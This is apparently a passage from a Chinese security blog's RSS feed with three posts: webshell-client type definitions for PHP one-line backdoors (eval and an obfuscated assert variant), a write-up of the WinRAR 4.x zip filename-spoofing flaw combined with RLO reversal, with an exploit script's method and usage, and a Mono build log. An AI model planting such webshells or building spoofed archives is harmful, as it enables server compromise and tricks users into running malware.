&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;name&amp;gt;phpEval&amp;lt;/name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @eval($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;None&amp;#34; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;funcCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;Base64&amp;#34; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;item&amp;gt;&amp;lt;![CDATA[print(&amp;#34;-&amp;gt;|&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">eval(base64_decode($_POST[$funcCode$]));
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">print(&amp;#34;|&amp;lt;-&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">die();]]&amp;gt;&amp;lt;/item&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;/customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;!-- more -->
&lt;p>eval函数执行php语句&lt;/p>
&lt;p>&lt;code>print(&amp;quot;-&amp;gt;|&amp;quot;);eval(base64_decode($_POST[$funcCode$]));print(&amp;quot;|&amp;lt;-&amp;quot;);die();&lt;/code>时，&lt;/p>
&lt;p>确实是正确的。&lt;/p>
&lt;p>然而当使用某些变形php一句话木马，如：&lt;/p>
&lt;p>&lt;code>&amp;lt;?php $a = &amp;quot;a&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;t&amp;quot;; $a($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;&lt;/code>&lt;/p>
&lt;p>时，&lt;/p>
&lt;p>Altman就无法连接一句话木马了。&lt;/p>
&lt;p>原因在于，这个变形木马使用的是assert函数，而eval与assert最主要区别是eval的参数可以是多个语句，而assert的参数是一个表达式。所以assert只会执行到print(&amp;quot;-&amp;gt;|&amp;quot;)代码，后面的代码则直接报错了。&lt;/p>
&lt;p>所以在了解到eval与assert的区别后，很容易写出一个新脚本类型，phpAssert.type定义如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;name&amp;gt;phpAssert&amp;lt;/name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @assert($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;None&amp;#34; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/basicSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;funcCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;Base64&amp;#34; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;item&amp;gt;&amp;lt;![CDATA[@eval(&amp;#34;print(&amp;#39;-&amp;gt;|&amp;#39;);&amp;#34;.base64_decode($_POST[$funcCode$]).&amp;#34;print(&amp;#39;|&amp;lt;-&amp;#39;);&amp;#34;);]]&amp;gt;&amp;lt;/item&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;/mainCodeSetting&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;/customShellType&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>PS:其实assert还有一个坑，那就是echo在assert中是不能直接使用的，因为在php中echo并不是一个函数:)，不能作为表达式。&lt;/p></description></item><item><title>Winrar4.x的文件欺骗漏洞利用脚本</title><link>https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/</link><pubDate>Mon, 31 Mar 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/</guid><description>&lt;h2 id="000-背景">0×00 背景
&lt;/h2>&lt;p>这几天仔细研究了winrar4.x系列的文件扩展名欺骗漏洞的那篇文章，通过一些测试对其有了一些新的想法和建议。（准确的说应该不能算文件扩展名欺骗漏，不止扩展名，整个文件名都是可以欺骗的）&lt;/p>
&lt;p>具体的漏洞成因相信文章中都很清楚了，简单说一下：&lt;/p>
&lt;p>zip格式中有2个filename，一般情况下，一般应用程序打开zip时，预览使用的是filename2，点击预览也是以filename2方式打开的，只有在解压的时候才会使用filename1。然而在winrar4.x中，点击预览是以预览filename1方式打开的。&lt;/p>
&lt;p>这会造成什么结果呢？当第一个filename为readme.exe，第二个filename为readme.txt时，用winrar4.x打开时，你在程序窗口看到的文件名为readme.txt，然后你再点击文件时却是以readme.exe方式打开，这就形成漏洞了。&lt;/p>
&lt;p>文章给出了如何利用这个bug的方法，更改filename2即可。但是作者是手动操作的，那么能不能写成利用脚本呢？这个filename2的长度有没有要求，需不需要和filename1长度相同？这正是本文要研究的。&lt;/p>
&lt;!-- more -->
&lt;h2 id="001-细节">0×01 细节
&lt;/h2>&lt;p>在研究这个问题以前，先科普一下zip格式（想看详细版的去网上下载APPNOTE.TXT）。&lt;/p>
&lt;p>zip格式由3部分组成：&lt;/p>
&lt;pre>&lt;code>1. 文件内容源数据
2. 目录源数据
3. 目录结束标识结构
&lt;/code>&lt;/pre>
&lt;p>以只压缩了一个文件的zip文件为例，大致格式为：&lt;/p>
&lt;pre>&lt;code>[file header]
[file data]
[data descriptor]
[central directory file header]
[end of central directory record]
&lt;/code>&lt;/pre>
&lt;p>其中关键的几个字段为：&lt;/p>
&lt;pre>&lt;code>[file header]:
Offset Bytes Description
18 4 Compressed size
26 2 File name length (n)
28 2 Extra field length (m)
30 n File name
30+n m Extra field
[central directory file header]:
Offset Bytes Description
28 2 File name length (n)
30 2 Extra field length (m)
34 2 File comment length (k)
[end of central directory record]:
Offset Bytes Description
12 4 Size of central directory (bytes)
16 4 Offset of start of central directory, relative to start of archive
&lt;/code>&lt;/pre>
&lt;p>在了解了zip基本格式后，我对winrar压缩生成的zip文件和用windows生成的zip文件进行了分析，它们的区别是winrar的zip文件在Extra field区段都进行了一些数据填充。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/img-20241015173502.webp"
loading="lazy"
alt="winrar压缩生成的zip文件和用windows生成的zip文件Hex对比"
>&lt;/p>
&lt;p>由于不清楚Extra field这部分的值会不会影响到winrar的校验，所以根据不同情况做了几个测试，当filename2长度改变时，并且对受filename2长度影响的所有字段（除Extra field）进行修改后，文件可以正常打开。测试结果证明Extra field的值并不会影响winrar打开zip文件。&lt;/p>
&lt;p>这样一来，只要按照zip的格式，更改和filename2有关的所有字段，就可以写出一个利用脚本了。&lt;/p>
&lt;p>等等，该文章中同时提到了，这个漏洞存在有一个限制：解压。如果你是以右键解压打开这个压缩包的话，那么只会使用filename1，和filename2无关，也就不存在这个漏洞了。作者在文章最后提到了可以利用LRO解决这个限制，那应该如何结合利用RLO呢？&lt;/p>
&lt;p>用WinHex对正常zip文件、使用了字符反转的zip文件进行分析：&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/img-20241015173502-1.webp"
loading="lazy"
alt="正常zip文件、使用了字符反转的zip文件对比"
>&lt;/p>
&lt;p>通过对比分析可以看到，当使用含有RLO文件名的文件进行压缩时，压缩的格式有点区别，继续做了几个测试，发现winrar在Extra field添加的信息，不会影响到漏洞的利用。&lt;/p>
&lt;p>据此可以将这两个漏洞完美的结合在一起，写成一个利用脚本。&lt;/p>
&lt;p>以python为例，具体思路为：&lt;/p>
&lt;pre>&lt;code>1．生成一个带LRO的文件名的文件，并用winrar压缩为zip。在python中可以使用u'\u202e'来构造字符串反转，用os.system()函数来执行winrar命令。
2．处理zip文件中的数据，将filename2更改为自己需要定义的字符串。按照zip格式依次读取，修改filename2为新的字符串，计算出新的长度，并且修改File name length2字段，Sizeofcentraldirectory 和Offsetofstartofcentraldirectory字段，处理好它们新的偏移位置。
3．重新生成新的zip。
&lt;/code>&lt;/pre>
&lt;p>在文章最后附上完整的利用脚本WinrarExp.py&lt;/p>
&lt;p>使用方法：&lt;/p>
&lt;p>&lt;code>WinrarExp.py [-f &amp;lt;open file&amp;gt;][-s &amp;lt;forged name&amp;gt;][-v &amp;lt;reversed string&amp;gt;]&lt;/code>&lt;/p>
&lt;pre>&lt;code>-f表示要压缩的文件，比如1.exe
-s表示要伪装的文件名，比如readme.txt
-v表示需要反转的字符串，该参数为选用。比如想要文件名反转变成readmeEXE.jpg则参数只要设置为EXE.jpg
&lt;/code>&lt;/pre>
&lt;p>下载地址为：http://www.keepwn.com/files/WinrarExp.py&lt;/p></description></item><item><title>ubuntu安装mono环境(一)</title><link>https://www.keepwn.com/posts/ubuntu-installed-mono-environment-1/</link><pubDate>Fri, 28 Mar 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/ubuntu-installed-mono-environment-1/</guid><description>&lt;h2 id="0x00-准备工作">0x00 准备工作
&lt;/h2>&lt;p>一个全新安装的ubuntu13.10系统&lt;/p>
&lt;h2 id="001-下载mono源代码并编译">0×01 下载Mono源代码并编译
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Desktop Downloads Music Public Videos
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Documents examples.desktop Pictures Templates
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ mkdir src
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ &lt;span class="nb">cd&lt;/span> src
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ wget http://download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--2014-03-27 21:24:30-- http://download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Resolving download.mono-project.com &lt;span class="o">(&lt;/span>download.mono-project.com&lt;span class="o">)&lt;/span>... 54.240.168.102, 54.230.156.158, 54.230.157.116, ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connecting to download.mono-project.com &lt;span class="o">(&lt;/span>download.mono-project.com&lt;span class="o">)&lt;/span>&lt;span class="p">|&lt;/span>54.240.168.102&lt;span class="p">|&lt;/span>:80... connected.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTTP request sent, awaiting response... &lt;span class="m">200&lt;/span> OK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Length: &lt;span class="m">77515552&lt;/span> &lt;span class="o">(&lt;/span>74M&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>application/x-bzip2&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Saving to: ‘mono-3.2.8.tar.bz2’
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">100%&lt;span class="o">[======================================&lt;/span>&amp;gt;&lt;span class="o">]&lt;/span> 77,515,552 189K/s in 10m 50s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mono-3.2.8.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ tar -xjf mono-3.2.8.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ &lt;span class="nb">cd&lt;/span> mono-3.2.8/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$ ./configure --prefix&lt;span class="o">=&lt;/span>/opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking build system type... i686-pc-linux-gnu
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking host system type... i686-pc-linux-gnu
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking target system type... i686-pc-linux-gnu
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> a BSD-compatible install... /usr/bin/install -c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether build environment is sane... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> a thread-safe mkdir -p... /bin/mkdir -p
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> gawk... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> mawk... mawk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether make sets &lt;span class="k">$(&lt;/span>MAKE&lt;span class="k">)&lt;/span>... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking how to create a ustar tar archive... gnutar
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether to &lt;span class="nb">enable&lt;/span> maintainer-specific portions of Makefiles... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether ln -s works... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether make supports nested variables... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking host platform characteristics... ok
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> gcc... gcc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> gcc... &lt;span class="o">(&lt;/span>cached&lt;span class="o">)&lt;/span> gcc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether the C compiler works... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> C compiler default output file name... a.out
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> suffix of executables...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether we are cross compiling... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> suffix of object files... o
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether we are using the GNU C compiler... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether gcc accepts -g... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> gcc option to accept ISO C89... none needed
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> style of include used by make... GNU
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking dependency style of gcc... gcc3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> g++... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether we are using the GNU C++ compiler... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether g++ accepts -g... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking dependency style of g++... none
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking dependency style of gcc... gcc3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> gawk... &lt;span class="o">(&lt;/span>cached&lt;span class="o">)&lt;/span> mawk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking whether gcc and cc understand -c and -o together... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">configure: error: You need to install g++
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;!-- more -->
&lt;p>因为没有安装g++而无法继续：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$ sudo apt-get install g++
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> nike:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Reading package lists... Done
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Building dependency tree
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Reading state information... Done
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The following extra packages will be installed:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cpp-4.8 g++-4.8 gcc-4.8 gcc-4.8-base libasan0 libatomic1 libgcc-4.8-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libgcc1 libgomp1 libitm1 libquadmath0 libstdc++-4.8-dev libstdc++6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Suggested packages:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gcc-4.8-locales g++-multilib g++-4.8-multilib gcc-4.8-doc libstdc++6-4.8-dbg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gcc-4.8-multilib libmudflap0-4.8-dev libgcc1-dbg libgomp1-dbg libitm1-dbg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libatomic1-dbg libasan0-dbg libtsan0-dbg libbacktrace1-dbg libquadmath0-dbg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libmudflap0-dbg libstdc++-4.8-doc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The following NEW packages will be installed:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">g++ g++-4.8 libstdc++-4.8-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The following packages will be upgraded:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cpp-4.8 gcc-4.8 gcc-4.8-base libasan0 libatomic1 libgcc-4.8-dev libgcc1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libgomp1 libitm1 libquadmath0 libstdc++6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">11&lt;/span> upgraded, &lt;span class="m">3&lt;/span> newly installed, &lt;span class="m">0&lt;/span> to remove and &lt;span class="m">275&lt;/span> not upgraded.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Need to get 25.9 MB of archives.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">After this operation, 28.2 MB of additional disk space will be used.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Do you want to &lt;span class="k">continue&lt;/span> &lt;span class="o">[&lt;/span>Y/n&lt;span class="o">]&lt;/span>?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重新初始化mono安装配置文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$ ./configure --prefix&lt;span class="o">=&lt;/span>/opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Engine:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GC: sgen and bundled Boehm GC with typed GC and parallel mark
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TLS: __thread
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SIGALTSTACK: yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Engine: Building and using the JIT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">oprofile: no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BigArrays: no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DTrace: no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LLVM Back End: no &lt;span class="o">(&lt;/span>dynamically loaded: no&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Libraries:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.NET 2.0/3.5: yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.NET 4.0: yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.NET 4.5: yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MonoDroid: no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MonoTouch: no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">JNI support: IKVM Native
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libgdiplus: assumed to be installed
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zlib:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>./configure通过。&lt;/p>
&lt;h2 id="002-编译mono源代码">0×02 编译Mono源代码
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
